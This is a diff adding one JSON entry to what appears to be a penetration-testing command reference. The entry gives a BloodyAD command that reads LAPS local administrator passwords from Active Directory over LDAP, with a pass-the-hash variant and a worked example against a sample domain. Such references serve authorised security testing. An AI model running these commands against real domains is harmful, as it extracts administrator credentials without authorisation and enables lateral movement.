@@ -1,0 +1,30 @@
+{
+  "id": "bloodyad-laps",
+  "name": "BloodyAD LAPS Password Read",
+  "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' -p '<password>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime",
+  "description": "Read LAPS passwords from Active Directory using BloodyAD",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "bloodyad",
+    "laps",
+    "ms-mcs-admpwd",
+    "local-admin",
+    "password"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' --hashes ':<hash>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
+    }
+  ],
+  "examples": [
+    "bloodyAD --host '192.168.1.2' -d 'corp.local' -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
+  ]
+}
